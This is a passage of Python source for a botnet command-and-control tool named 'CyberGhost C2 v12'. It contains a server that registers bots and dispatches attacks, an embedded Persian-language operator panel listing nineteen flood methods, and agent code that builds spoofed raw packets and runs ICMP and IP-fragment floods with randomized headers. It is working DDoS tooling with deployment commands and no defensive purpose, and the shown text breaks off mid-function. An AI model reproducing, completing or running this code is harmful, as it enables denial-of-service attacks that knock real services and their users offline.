                if not verify_command_sig(base, sig):
                    log.warning("bot %s: bad sig on %s", bot_id, t); continue
            if t in ("hello", "heartbeat"):
                await upsert_bot({
                    "bot_id": bot_id, "hostname": m.get("hostname", "unknown"), "ip": ip,
                    "os": m.get("os", "unknown"), "arch": m.get("arch", "unknown"),
                    "cpu_cores": int(m.get("cpu_cores", 1)), "ram_mb": int(m.get("ram_mb", 0)),
                    "last_seen": time.time(), "agent_version": m.get("version", "?"),
                    "capabilities": m.get("capabilities", "")})
                if t == "hello":
                    await hub.bcast({"type": "bot_online", "bot_id": bot_id,
                                     "hostname": m.get("hostname", "?"), "os": m.get("os", "?")})
                    for cj in await take_pending(bot_id):
                        with contextlib.suppress(Exception): await ws.send_text(cj)
            elif t == "stats":
                aid = int(m.get("attack_id", 0))
                if aid:
                    r, b = int(m.get("requests", 0)), int(m.get("bytes", 0))
                    await bump(aid, r, b)
                    await hub.bcast({"type": "stats", "attack_id": aid, "requests": r, "bytes": b})
    except WebSocketDisconnect: pass
    except Exception as e: log.warning("bot ws err %s: %s", bot_id, e)
    finally:
        await hub.drop_bot(bot_id); await bot_offline(bot_id)
        await hub.bcast({"type": "bot_offline", "bot_id": bot_id})

@app.get("/api/bots")
async def api_bots(_=Depends(current_admin)): return await list_bots()

@app.get("/api/attacks")
async def api_attacks(_=Depends(current_admin)): return await list_attacks()

@app.get("/api/attack/{aid}")
async def api_attack_get(aid: int, _=Depends(current_admin)):
    a = await get_attack(aid)
    if not a: raise HTTPException(404, "not found")
    return a

@app.get("/api/stats")
async def api_stats(_=Depends(current_admin)):
    bots = await list_bots(); atts = await list_attacks(200)
    online = sum(1 for b in bots if b["connected"])
    running = [a for a in atts if a["status"] == "running"]
    return {"bots_total": len(bots), "bots_online": online,
            "attacks_running": len(running),
            "total_requests": sum(a["requests_sent"] for a in running),
            "total_bytes": sum(a["bytes_sent"] for a in running),
            "version": VERSION, "build": BUILD,
            "proxy": await proxy_pool.stats(), "tor": USE_TOR}

@app.post("/api/attack")
async def api_attack(a: AttackIn, p=Depends(current_admin)):
    admin = p.get("sub", "?")
    if not await attack_rate_ok(admin): raise HTTPException(429, "attack rate limit")
    if REQUIRE_PROXY:
        stats = await proxy_pool.stats()
        if stats["healthy"] == 0: raise HTTPException(503, "no healthy proxy")
    ip, host = validate_target_c2(a.target)
    running = [x for x in await list_attacks(200) if x["status"] == "running"]
    if len(running) >= MAX_CONCURRENT_ATTACKS: raise HTTPException(429, "max concurrent")
    online = [b for b in await list_bots() if b["connected"]]
    if not online: raise HTTPException(400, "no bots online")
    started = time.time()
    payload_base = {"type": "attack", "target": a.target, "target_ip": ip,
                    "method": a.method, "port": a.port or 0,
                    "duration": a.duration, "threads": a.threads,
                    "started_at": started}
    aid, payload = await new_attack_atomic({
        "target": a.target, "target_ip": ip, "method": a.method, "port": a.port or 0,
        "duration": a.duration, "threads": a.threads,
        "started_at": started, "assigned_bots": len(online)}, payload_base)
    audit("attack_start", id=aid, target=a.target, method=a.method, by=admin)
    await hub.to_bots([b["bot_id"] for b in online], payload)
    await hub.bcast({"type": "attack_started", "attack_id": aid,
                     "target": a.target, "method": a.method})
    asyncio.create_task(_finish_later(aid, a.duration))
    return {"attack_id": aid, "assigned_bots": len(online)}

@app.post("/api/attack/{aid}/stop")
async def api_attack_stop(aid: int, p=Depends(current_admin)):
    a = await get_attack(aid)
    if not a: raise HTTPException(404, "not found")
    if a["status"] != "running": raise HTTPException(400, "not running")
    await finish_attack(aid, "stopped")
    await hub.to_all_bots({"type": "stop", "attack_id": aid})
    await hub.bcast({"type": "attack_stopped", "attack_id": aid})
    return {"ok": True}

@app.post("/api/bot/{bot_id}/kill")
async def api_bot_kill(bot_id: str, p=Depends(current_admin)):
    await hub.to_bots([bot_id], {"type": "kill"})
    return {"ok": True}

async def _finish_later(aid, dur):
    await asyncio.sleep(dur)
    a = await get_attack(aid)
    if a and a["status"] == "running":
        await finish_attack(aid, "finished")
        await hub.bcast({"type": "attack_finished", "attack_id": aid})

@app.websocket("/ws/admin")
async def admin_ws(ws: WebSocket):
    proto = ws.headers.get("sec-websocket-protocol", "")
    if not proto.startswith("bearer."):
        await ws.close(code=4001); return
    token = proto[7:]
    try:
        jwt.decode(token, JWT_SECRET, algorithms=[JWT_ALG], audience=JWT_AUD, issuer=JWT_ISS)
    except JWTError:
        await ws.close(code=4001); return
    await ws.accept(); await hub.add_admin(ws)
    try:
        while True: await ws.receive_text()
    except WebSocketDisconnect: pass
    finally: await hub.drop_admin(ws)

@app.get("/", response_class=HTMLResponse)
async def root(): return HTMLResponse(PANEL_HTML)

@app.get("/healthz")
async def healthz(): return {"ok": True, "version": VERSION}

# ============================================================
# PANEL
# ============================================================
PANEL_HTML = r"""<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head><meta charset="utf-8"/><title>CYBERGHOST // C2 v12</title>
<style>
:root{--bg:#020604;--panel:#05130b;--line:#0a2a1a;--fg:#00ff9d;--dim:#1a6b4a;--warn:#ff2d55;--amber:#ffb347;--glow:0 0 8px rgba(0,255,157,.45);}
*{box-sizing:border-box;margin:0;padding:0}
html,body{height:100%;background:var(--bg);color:var(--fg);font-family:'JetBrains Mono',Consolas,monospace;font-size:13px;overflow:hidden}
.app{display:grid;grid-template-columns:220px 1fr;height:100vh}
.sidebar{background:var(--panel);border-left:1px solid var(--line);display:flex;flex-direction:column;padding:16px 0}
.brand{padding:0 18px 18px;border-bottom:1px solid var(--line);margin-bottom:12px}
.brand h1{font-size:16px;letter-spacing:3px;text-shadow:var(--glow)}
.brand h1 b{color:var(--warn)} .brand small{color:var(--dim);font-size:10px}
.nav a{display:flex;align-items:center;gap:10px;padding:10px 18px;color:var(--dim);text-decoration:none;font-size:12px;border-right:2px solid transparent}
.nav a:hover,.nav a.active{color:var(--fg);border-right-color:var(--fg);background:rgba(0,255,157,.04)}
.sidebar .foot{margin-top:auto;padding:12px 18px;font-size:10px;color:var(--dim);border-top:1px solid var(--line)}
.main{overflow-y:auto;padding:20px 24px}
.topbar{display:flex;justify-content:space-between;margin-bottom:18px}
.topbar h2{font-size:14px} .topbar .clock{color:var(--dim);font-size:11px}
.stats{display:grid;grid-template-columns:repeat(5,1fr);gap:12px;margin-bottom:18px}
.stat{background:var(--panel);border:1px solid var(--line);padding:14px}
.stat .label{color:var(--dim);font-size:10px;margin-bottom:6px}
.stat .val{font-size:22px;text-shadow:var(--glow)}
.stat .val.warn{color:var(--warn)} .stat .val.amber{color:var(--amber)}
.row{display:grid;grid-template-columns:2fr 1fr;gap:12px;margin-bottom:18px}
.card{background:var(--panel);border:1px solid var(--line);padding:14px}
.card h3{font-size:11px;color:var(--dim);margin-bottom:10px;display:flex;justify-content:space-between}
.card h3 span{color:var(--fg)}
canvas{width:100%;height:180px;display:block}
table{width:100%;border-collapse:collapse;font-size:11px}
th,td{padding:7px 6px;text-align:right;border-bottom:1px solid var(--line)}
th{color:var(--dim);font-weight:normal;font-size:10px}
input,select,button{background:var(--bg);border:1px solid var(--line);color:var(--fg);padding:9px 11px;font-family:inherit;font-size:12px;width:100%;margin-bottom:8px;outline:none}
button{cursor:pointer} button:hover{background:rgba(0,255,157,.1)}
button.fire{border-color:var(--warn);color:var(--warn);padding:12px}
.mgrid{display:grid;grid-template-columns:repeat(4,1fr);gap:6px;margin-bottom:10px}
.mbtn{background:var(--bg);border:1px solid var(--line);padding:8px 4px;text-align:center;font-size:10px;cursor:pointer}
.mbtn.sel{border-color:var(--fg);color:var(--fg);background:rgba(0,255,157,.1)}
.mbtn small{display:block;color:var(--dim);font-size:8px;margin-top:2px}
.log{height:180px;overflow-y:auto;background:#000;border:1px solid var(--line);padding:8px;font-size:10.5px;color:var(--dim)}
.log .ok{color:var(--fg)} .log .warn{color:var(--warn)}
.login{max-width:340px;margin:16vh auto;background:var(--panel);border:1px solid var(--line);padding:28px}
.login h1{font-size:16px;text-align:center;margin-bottom:20px}
.login h1 b{color:var(--warn)}
.view{display:none} .view.active{display:block}
.dot{display:inline-block;width:6px;height:6px;border-radius:50%;background:var(--dim);margin-left:4px}
.dot.on{background:var(--fg);box-shadow:0 0 6px var(--fg)}
pre{background:#000;border:1px solid var(--line);padding:10px;font-size:10.5px;color:var(--fg);overflow-x:auto}
</style></head><body>
<div id="loginView" class="login">
<h1>CYBER<b>GHOST</b></h1>
<input id="u" placeholder="username" value="ghost"/>
<input id="p" type="password" placeholder="password"/>
<button onclick="doLogin()">ورود</button>
<div id="lerr" style="color:var(--warn);font-size:11px;margin-top:8px;min-height:14px"></div>
</div>
<div id="appView" class="app" style="display:none">
<aside class="sidebar">
<div class="brand"><h1>CYBER<b>GHOST</b></h1><small>// C2 CONTROL v12</small></div>
<nav class="nav">
<a href="#" class="active" data-view="dashboard">▤ داشبورد</a>
<a href="#" data-view="bots">◉ بات‌ها</a>
<a href="#" data-view="attacks">⚔ حمله‌ها</a>
<a href="#" data-view="methods">⚙ متدها</a>
<a href="#" data-view="proxy">◈ پروکسی</a>
<a href="#" data-view="logs">▸ لاگ‌ها</a>
<a href="#" data-view="settings">☰ تنظیمات</a>
</nav>
<div class="foot">v12.0 — BUILD 6767<br/><span id="footstatus">STATUS: ONLINE</span></div>
</aside>
<main class="main">
<div class="topbar"><h2 id="viewTitle">داشبورد</h2><div class="clock" id="clock">--:--:--</div></div>
<section class="view active" id="view-dashboard">
<div class="stats">
<div class="stat"><div class="label">BOTS ONLINE</div><div class="val" id="s-online">0</div></div>
<div class="stat"><div class="label">TOTAL BOTS</div><div class="val amber" id="s-total">0</div></div>
<div class="stat"><div class="label">ACTIVE ATTACKS</div><div class="val warn" id="s-att">0</div></div>
<div class="stat"><div class="label">TOTAL RPS</div><div class="val" id="s-rps">0</div></div>
<div class="stat"><div class="label">PROXY LIVE</div><div class="val amber" id="s-proxy">0/0</div></div>
</div>
<div class="row">
<div class="card"><h3>RPS / BANDWIDTH <span id="bw-label">0 MB/s</span></h3><canvas id="chart"></canvas></div>
<div class="card"><h3>QUICK FIRE</h3><div class="mgrid" id="quickMethods"></div>
<input id="qt" placeholder="target.com"/><button class="fire" onclick="quickFire()">شلیک سریع</button></div>
</div>
<div class="card"><h3>ACTIVE ATTACKS <span id="activeCount">0</span></h3>
<table><thead><tr><th>#</th><th>target</th><th>method</th><th>bots</th><th>requests</th><th>bytes</th><th>status</th><th>action</th></tr></thead>
<tbody id="dashAttacks"></tbody></table></div>
</section>
<section class="view" id="view-bots"><div class="card"><h3>BOT ARMY <span id="botCount">0</span></h3>
<table><thead><tr><th>ID</th><th>host</th><th>ip</th><th>os</th><th>arch</th><th>cpu</th><th>ram</th><th>ver</th><th>caps</th><th>last seen</th><th>status</th><th>action</th></tr></thead>
<tbody id="botsTable"></tbody></table></div></section>
<section class="view" id="view-attacks"><div class="row">
<div class="card"><h3>NEW ATTACK</h3>
<input id="tgt" placeholder="target.com"/>
<div class="mgrid" id="fullMethods"></div>
<input id="port" placeholder="port" type="number"/>
<label style="color:var(--dim);font-size:10px">DURATION <span id="durv">60</span>s</label>
<input id="dur" type="range" min="5" max="3600" value="60" oninput="durv.textContent=this.value"/>
<label style="color:var(--dim);font-size:10px">THREADS <span id="thrv">256</span></label>
<input id="thr" type="range" min="1" max="4096" value="256" oninput="thrv.textContent=this.value"/>
<button class="fire" onclick="launch()">شلیک</button>
<div id="aerr" style="color:var(--warn);font-size:11px"></div></div>
<div class="card"><h3>HISTORY <span id="histCount">0</span></h3>
<table><thead><tr><th>#</th><th>target</th><th>method</th><th>status</th></tr></thead><tbody id="histTable"></tbody></table></div>
</div></section>
<section class="view" id="view-methods"><div class="card"><h3>ATTACK METHODS</h3>
<table><thead><tr><th>method</th><th>layer</th><th>description</th></tr></thead><tbody id="methodsTable"></tbody></table></div></section>
<section class="view" id="view-proxy"><div class="card"><h3>PROXY POOL <span id="proxyStat">0/0</span></h3>
<table><tbody>
<tr><td style="color:var(--dim)">total loaded</td><td id="px-total">0</td></tr>
<tr><td style="color:var(--dim)">healthy</td><td id="px-healthy">0</td></tr>
<tr><td style="color:var(--dim)">tor gateway</td><td id="px-tor">disabled</td></tr>
</tbody></table></div></section>
<section class="view" id="view-logs"><div class="card"><h3>LIVE TERMINAL <span id="logCount">0</span></h3><div class="log" id="log"></div></div></section>
<section class="view" id="view-settings">
<div class="card"><h3>SERVER INFO</h3>
<table><tbody>
<tr><td style="color:var(--dim)">endpoint</td><td id="info-endpoint">—</td></tr>
<tr><td style="color:var(--dim)">version</td><td>CyberGhost v12.0</td></tr>
</tbody></table></div>
<div class="card" style="margin-top:12px"><h3>DEPLOY</h3>
<pre>python app.py --gen-token &lt;bot_id&gt;
python app.py --hash-pass
python tor.py --mode gateway</pre>
<pre>python app.py --agent --c2 wss://server --token TOKEN --workers 4</pre>
</div></section>
</main>
</div>
<script>
const METHODS = [
{id:"icmp_flood",layer:"L3",desc:"ICMP echo flood"},
{id:"ip_fragment",layer:"L3",desc:"IP fragment flood"},
{id:"udp_fragment",layer:"L3",desc:"UDP fragment flood"},
{id:"tcp_syn",layer:"L4",desc:"TCP SYN flood"},
{id:"tcp_ack",layer:"L4",desc:"TCP ACK flood"},
{id:"tcp_rst",layer:"L4",desc:"TCP RST flood"},
{id:"tcp_connect",layer:"L4",desc:"TCP connect flood"},
{id:"udp_flood",layer:"L4",desc:"UDP payload flood"},
{id:"tls_handshake",layer:"L5",desc:"TLS handshake flood"},
{id:"tls_reneg",layer:"L5",desc:"TLS fresh-handshake flood"},
{id:"tls_record",layer:"L6",desc:"TLS record flood"},
{id:"http_get",layer:"L7",desc:"HTTP GET via proxy"},
{id:"http_post",layer:"L7",desc:"HTTP POST via proxy"},
{id:"http_rand",layer:"L7",desc:"random HTTP method"},
{id:"http2_rapid",layer:"L7",desc:"HTTP/2 rapid reset"},
{id:"slowloris",layer:"L7",desc:"slow header hold"},
{id:"slow_post",layer:"L7",desc:"slow body hold"},
{id:"dns_water",layer:"L7",desc:"DNS water torture"},
{id:"dns_nxdomain",layer:"L7",desc:"NXDOMAIN flood"},
];
let token=localStorage.getItem("cg_token")||"";
let ws=null,selMethod="http_get";
let rpsHistory=new Array(60).fill(0),bwHistory=new Array(60).fill(0);
let logLines=0,pollTimer=null;
async function doLogin(){
const r=await fetch("/api/token",{method:"POST",body:new URLSearchParams({username:u.value,password:p.value})});
if(!r.ok){document.getElementById("lerr").textContent="fail";return;}
token=(await r.json()).access_token;localStorage.setItem("cg_token",token);showApp();
}
function showApp(){
document.getElementById("loginView").style.display="none";
document.getElementById("appView").style.display="grid";
buildMethodUI();openWs();poll();
pollTimer=setInterval(poll,3000);setInterval(tickClock,1000);setInterval(drawChart,1000);
document.getElementById("info-endpoint").textContent=location.origin;
}
function buildMethodUI(){
const qm=document.getElementById("quickMethods");qm.innerHTML="";
const fm=document.getElementById("fullMethods");fm.innerHTML="";
METHODS.forEach(m=>{
const a=document.createElement("div");
a.className="mbtn"+(m.id===selMethod?" sel":"");
a.innerHTML=m.id+"<small>"+m.layer+"</small>";a.dataset.method=m.id;
a.onclick=()=>{selMethod=m.id;refreshMethodSel();};fm.appendChild(a);
if(["http_get","http2_rapid","tcp_syn","dns_water"].includes(m.id)){
const b=a.cloneNode(true);b.onclick=()=>{selMethod=m.id;refreshMethodSel();};qm.appendChild(b);
}
});
document.getElementById("methodsTable").innerHTML=METHODS.map(m=>
'<tr><td style="color:var(--fg)">'+m.id+'</td><td>'+m.layer+'</td><td style="color:var(--dim)">'+m.desc+'</td></tr>').join("");
}
function refreshMethodSel(){
document.querySelectorAll(".mbtn").forEach(el=>el.classList.toggle("sel",el.dataset.method===selMethod));
}
function drawChart(){
const c=document.getElementById("chart");if(!c)return;
const dpr=window.devicePixelRatio||1;const w=c.clientWidth,h=c.clientHeight;
if(c.width!==w*dpr||c.height!==h*dpr){c.width=w*dpr;c.height=h*dpr;}
const ctx=c.getContext("2d");ctx.setTransform(dpr,0,0,dpr,0,0);
ctx.fillStyle="#020604";ctx.fillRect(0,0,w,h);
ctx.strokeStyle="#0a2a1a";for(let i=0;i<=4;i++){const y=h*i/4;ctx.beginPath();ctx.moveTo(0,y);ctx.lineTo(w,y);ctx.stroke();}
const maxR=Math.max(1,...rpsHistory),maxB=Math.max(0.01,...bwHistory);
function plot(arr,max,color){ctx.strokeStyle=color;ctx.lineWidth=2;ctx.beginPath();
arr.forEach((v,i)=>{const x=w*i/(arr.length-1);const y=h-(v/max)*h*0.9;if(i===0)ctx.moveTo(x,y);else ctx.lineTo(x,y);});ctx.stroke();}
plot(rpsHistory,maxR,"#00ff9d");plot(bwHistory,maxB,"#ffb347");
}
function openWs(){
const proto=location.protocol==="https:"?"wss":"ws";
ws=new WebSocket(proto+"://"+location.host+"/ws/admin",["bearer."+token]);
ws.onmessage=e=>{const m=JSON.parse(e.data);
if(m.type==="bot_online")addLog("bot online: "+m.bot_id,"ok");
if(m.type==="bot_offline")addLog("bot offline: "+m.bot_id,"warn");
if(m.type==="attack_started"){addLog("attack #"+m.attack_id+" → "+m.target,"warn");poll();}
if(m.type==="attack_finished"){addLog("attack #"+m.attack_id+" finished","ok");poll();}
if(m.type==="stats"){rpsHistory.push(m.requests);rpsHistory.shift();bwHistory.push(m.bytes/1024/1024);bwHistory.shift();
document.getElementById("bw-label").textContent=bwHistory.reduce((a,b)=>a+b,0).toFixed(1)+" MB/s";
document.getElementById("s-rps").textContent=rpsHistory.reduce((a,b)=>a+b,0);}
};
ws.onclose=()=>setTimeout(openWs,2000);
}
async function poll(){await loadStats();await loadBots();await loadAttacks();}
async function loadStats(){
const r=await fetch("/api/stats",{headers:{Authorization:"Bearer "+token}});
if(r.status===401){localStorage.removeItem("cg_token");location.reload();return;}
if(!r.ok)return;const s=await r.json();
document.getElementById("s-online").textContent=s.bots_online;
document.getElementById("s-total").textContent=s.bots_total;
document.getElementById("s-att").textContent=s.attacks_running;
if(s.proxy){document.getElementById("s-proxy").textContent=s.proxy.healthy+"/"+s.proxy.total;
document.getElementById("proxyStat").textContent=s.proxy.healthy+"/"+s.proxy.total;
document.getElementById("px-total").textContent=s.proxy.total;
document.getElementById("px-healthy").textContent=s.proxy.healthy;
document.getElementById("px-tor").textContent=s.tor?"enabled":"disabled";}
}
async function loadBots(){
const r=await fetch("/api/bots",{headers:{Authorization:"Bearer "+token}});
if(!r.ok)return;const bots=await r.json();
document.getElementById("botCount").textContent=bots.length;
document.getElementById("botsTable").innerHTML=bots.map(b=>'<tr><td style="color:var(--fg)">'+b.bot_id.slice(0,12)+'</td><td>'+b.hostname+'</td><td>'+b.ip+'</td><td>'+b.os+'</td><td>'+b.arch+'</td><td>'+b.cpu_cores+'</td><td>'+b.ram_mb+'MB</td><td>'+(b.agent_version||"?")+'</td><td style="color:var(--dim)">'+(b.capabilities||"—")+'</td><td style="color:var(--dim)">'+new Date(b.last_seen*1000).toLocaleTimeString()+'</td><td><span class="dot '+(b.connected?'on':'')+'"></span>'+(b.connected?'online':'offline')+'</td><td><button class="kill" onclick="killBot(\''+b.bot_id+'\')" style="border-color:var(--warn);color:var(--warn);padding:4px 8px;font-size:10px;width:auto">kill</button></td></tr>').join("");
}
async function loadAttacks(){
const r=await fetch("/api/attacks",{headers:{Authorization:"Bearer "+token}});
if(!r.ok)return;const atts=await r.json();
const running=atts.filter(a=>a.status==="running");
document.getElementById("activeCount").textContent=running.length;
document.getElementById("histCount").textContent=atts.length;
document.getElementById("dashAttacks").innerHTML=running.map(a=>'<tr><td style="color:var(--warn)">'+a.id+'</td><td>'+a.target+'</td><td>'+a.method+'</td><td>'+a.assigned_bots+'</td><td>'+a.requests_sent+'</td><td>'+(a.bytes_sent/1024/1024).toFixed(2)+'MB</td><td style="color:var(--warn)">running</td><td><button onclick="stopAttack('+a.id+')" style="border-color:var(--amber);color:var(--amber);padding:4px 8px;font-size:10px;width:auto">stop</button></td></tr>').join("")||'<tr><td colspan="8" style="color:var(--dim);text-align:center">no active</td></tr>';
document.getElementById("histTable").innerHTML=atts.slice(0,30).map(a=>'<tr><td>'+a.id+'</td><td>'+a.target+'</td><td>'+a.method+'</td><td style="color:'+(a.status==='running'?'var(--warn)':'var(--dim)')+'">'+a.status+'</td></tr>').join("");
}
async function launch(){
document.getElementById("aerr").textContent="";
const target=document.getElementById("tgt").value.trim();
const port=parseInt(document.getElementById("port").value||"0");
const duration=parseInt(document.getElementById("dur").value);
const threads=parseInt(document.getElementById("thr").value);
if(!target){document.getElementById("aerr").textContent="kosong";return;}
const r=await fetch("/api/attack",{method:"POST",headers:{"Content-Type":"application/json",Authorization:"Bearer "+token},
body:JSON.stringify({target,method:selMethod,port,duration,threads})});
if(!r.ok){document.getElementById("aerr").textContent="err: "+(await r.text());return;}
const j=await r.json();addLog("dispatched #"+j.attack_id,"warn");poll();
}
async function quickFire(){
const target=document.getElementById("qt").value.trim();if(!target)return;
const r=await fetch("/api/attack",{method:"POST",headers:{"Content-Type":"application/json",Authorization:"Bearer "+token},
body:JSON.stringify({target,method:selMethod,port:0,duration:60,threads:256})});
if(r.ok){const j=await r.json();addLog("quick #"+j.attack_id,"warn");poll();}
}
async function stopAttack(aid){
await fetch("/api/attack/"+aid+"/stop",{method:"POST",headers:{Authorization:"Bearer "+token}});poll();
}
async function killBot(bid){
await fetch("/api/bot/"+bid+"/kill",{method:"POST",headers:{Authorization:"Bearer "+token}});
}
document.querySelectorAll(".nav a").forEach(a=>{a.onclick=e=>{e.preventDefault();
document.querySelectorAll(".nav a").forEach(x=>x.classList.remove("active"));a.classList.add("active");
const v=a.dataset.view;document.querySelectorAll(".view").forEach(s=>s.classList.remove("active"));
document.getElementById("view-"+v).classList.add("active");
document.getElementById("viewTitle").textContent=a.textContent.trim();};});
function addLog(msg,cls){cls=cls||"";const l=document.getElementById("log");if(!l)return;
l.innerHTML+='<div class="'+cls+'">['+new Date().toLocaleTimeString()+'] '+msg+'</div>';
logLines++;document.getElementById("logCount").textContent=logLines;l.scrollTop=l.scrollHeight;}
function tickClock(){document.getElementById("clock").textContent=new Date().toLocaleTimeString();}
if(token)showApp();
</script></body></html>
"""

# ============================================================
# AGENT ENGINE
# ============================================================
UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36",
]
LANG_POOL = ["en-US,en;q=0.9", "en-GB,en;q=0.9", "id-ID,id;q=0.9,en;q=0.8",
             "fa-IR,fa;q=0.9,en;q=0.8", "de-DE,de;q=0.9,en;q=0.8", "fr-FR,fr;q=0.9,en;q=0.8"]
XFF_RANGES = [
    (0x49000000, 0x4900FFFF), (0x54000000, 0x5400FFFF),
    (0xAF000000, 0xAF00FFFF), (0x18000000, 0x1800FFFF),
    (0xBD000000, 0xBD00FFFF), (0x6F000000, 0x6F00FFFF),
    (0x7A000000, 0x7A00FFFF), (0x01000000, 0x0100FFFF),
    (0x5F000000, 0x5F00FFFF), (0xC0000000, 0xC000FFFF),
]

def rnd(n=8): return ''.join(random.choices(string.ascii_letters+string.digits, k=n))
def rnd_ip(): return ".".join(str(random.randint(1,254)) for _ in range(4))

def rnd_xff():
    base, end = random.choice(XFF_RANGES)
    v = random.randint(base, end)
    return f"{(v>>24)&0xFF}.{(v>>16)&0xFF}.{(v>>8)&0xFF}.{v&0xFF}"

def resolve_host(target):
    if "://" not in target: target = "http://" + target
    u = urlparse(target)
    host = u.hostname or target
    try: ip = socket.gethostbyname(host)
    except Exception: ip = host
    return ip, host

def csum16(data):
    if len(data) % 2: data += b"\x00"
    s = 0
    for i in range(0, len(data), 2):
        s += (data[i] << 8) + data[i+1]
    s = (s >> 16) + (s & 0xFFFF); s += (s >> 16)
    return (~s) & 0xFFFF

def build_ip_tcp(src_ip, dst_ip, src_port, dst_port, flags, seq, ack=0, payload=b""):
    total = 40 + len(payload)
    ident = random.randint(0, 65535)
    ip_nc = struct.pack("!BBHHHBBH4s4s", 0x45, 0, total, ident, 0, 64, 6, 0,
                        socket.inet_aton(src_ip), socket.inet_aton(dst_ip))
    ip_csum = csum16(ip_nc)
    ip_hdr = struct.pack("!BBHHHBBH4s4s", 0x45, 0, total, ident, 0, 64, 6, ip_csum,
                        socket.inet_aton(src_ip), socket.inet_aton(dst_ip))
    tcp_nc = struct.pack("!HHIIBBHHH", src_port, dst_port, seq, ack, (5<<4), flags, 65535, 0, 0)
    pseudo = socket.inet_aton(src_ip) + socket.inet_aton(dst_ip) + struct.pack("!BBH", 0, 6, 20 + len(payload))
    tcp_csum = csum16(pseudo + tcp_nc + payload)
    tcp_hdr = struct.pack("!HHIIBBHHH", src_port, dst_port, seq, ack, (5<<4), flags, 65535, tcp_csum, 0)
    return ip_hdr + tcp_hdr + payload

def build_icmp_echo(payload):
    hdr = struct.pack("!BBHHH", 8, 0, 0, random.randint(0,65535), 1)
    csum = csum16(hdr + payload)
    return struct.pack("!BBHHH", 8, 0, csum, random.randint(0,65535), 1) + payload

def build_ip_frag(src_ip, dst_ip, proto, payload, offset, mf=True):
    total = 20 + len(payload)
    ident = random.randint(0, 65535)
    flags_off = (0x2000 if mf else 0) | (offset & 0x1FFF)
    ip_nc = struct.pack("!BBHHHBBH4s4s", 0x45, 0, total, ident, flags_off, 64, proto, 0,
                        socket.inet_aton(src_ip), socket.inet_aton(dst_ip))
    ip_csum = csum16(ip_nc)
    return struct.pack("!BBHHHBBH4s4s", 0x45, 0, total, ident, flags_off, 64, proto, ip_csum,
                       socket.inet_aton(src_ip), socket.inet_aton(dst_ip)) + payload

def raw_socket_tcp():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1); return s
    except PermissionError: return None

def raw_socket_icmp():
    try: return socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except PermissionError: return None

class StatsSender:
    def __init__(self, ws, attack_id):
        self.ws = ws; self.attack_id = attack_id
        self.q = asyncio.Queue(maxsize=128); self.dead = False
        self.task = asyncio.create_task(self._run())
    async def send(self, r, b):
        if self.dead or (r == 0 and b == 0): return
        try: self.q.put_nowait((r, b))
        except asyncio.QueueFull: pass
    async def _run(self):
        try:
            while True:
                r, b = await self.q.get()
                try: await self.ws.send(json.dumps({"type":"stats","attack_id":self.attack_id,"requests":r,"bytes":b}))
                except Exception:
                    self.dead = True
                    while not self.q.empty():
                        with contextlib.suppress(Exception): self.q.get_nowait()
                    return
        except asyncio.CancelledError:
            self.dead = True; raise
    def stop(self):
        self.dead = True
        if not self.task.done(): self.task.cancel()

async def icmp_flood(ctx):
    ip, host = resolve_host(ctx["target"])
    loop = asyncio.get_running_loop(); deadline = time.time()+ctx["duration"]; stats = {"r":0,"b":0}
    sock = raw_socket_icmp()
    if sock is None: return await udp_flood(ctx)
    sock.setblocking(False)
    async def one():
        while time.time() < deadline:
            try:
                pkt = build_icmp_echo(os.urandom(random.randint(8,1024)))
                await loop.sock_sendto(sock, pkt, (ip, 0))
                stats["r"] += 1; stats["b"] += len(pkt)
            except Exception: pass
    tasks = [asyncio.create_task(one()) for _ in range(min(ctx["threads"],128))]
    while time.time() < deadline:
        await asyncio.sleep(1); await ctx["on_stats"](stats["r"],stats["b"]); stats["r"]=0; stats["b"]=0
    for t in tasks: t.cancel(); sock.close()

async def ip_fragment(ctx):
    ip, host = resolve_host(ctx["target"]); loop = asyncio.get_running_loop()
    deadline = time.time()+ctx["duration"]; stats = {"r":0,"b":0}
    sock = raw_socket_tcp()
    if sock is None: return await udp_flood(ctx)
    sock.setblocking(False)
    async def one():
        while time.time() < deadline:
            try:
                src = rnd_ip()
                for off_idx in range(0, 3):
                    payload = os.urandom(680)
                    pkt = build_ip_frag(src, ip, socket.IPPROTO_UDP, payload, off_idx*85, mf=(off_idx<2))
                    await loop.sock_sendto(sock, pkt, (ip, 0))
                    stats["r"] += 1; stats["b"] += len(pkt)
            except Exception: pass
    tasks = [asyncio.create_task(one()) for _ in range(min(ctx["threads"],128))]
    while time.time() < deadline:
        await asyncio.sleep(1); await ctx["on_stats"](stats["r"],stats["b"]); stats["r"]=0; stats["b"]=0
    for t in tasks: t.cancel(); sock.close()

async def udp_fragment(ctx):
    ip, host = resolve_host(ctx["target"]); loop = asyncio.get_running_loop()
    deadline = time.time()+ctx["duration"]; stats = {"r":0,"b":0}
    sock = raw_socket_tcp()
